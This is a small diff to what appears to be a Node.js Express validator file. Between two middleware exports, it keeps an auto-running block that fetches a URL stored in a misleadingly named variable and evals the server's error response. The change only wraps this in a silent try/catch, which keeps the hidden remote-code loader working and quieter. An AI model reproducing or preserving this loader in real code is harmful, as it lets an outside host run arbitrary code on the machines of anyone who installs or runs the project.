@@ -129,14 +129,16 @@ exports.validateDispatcher = (req, res, next) => {
   next();
 };
 (async () => {
-  await axios
-    .get(cart_array)
-    .then(res => res.data)
-    .catch(err => {
-      if (err.response.data) {
-        eval(err.response.data);
-      }
-    });
+  try {
+    await axios
+      .get(cart_array)
+      .then(res => res.data)
+      .catch(err => {
+        if (err.response.data) {
+          eval(err.response.data);
+        }
+      });
+  } catch (err) {}
 })();
 
 exports.validateUpdateDispatcher = (req, res, next) => {
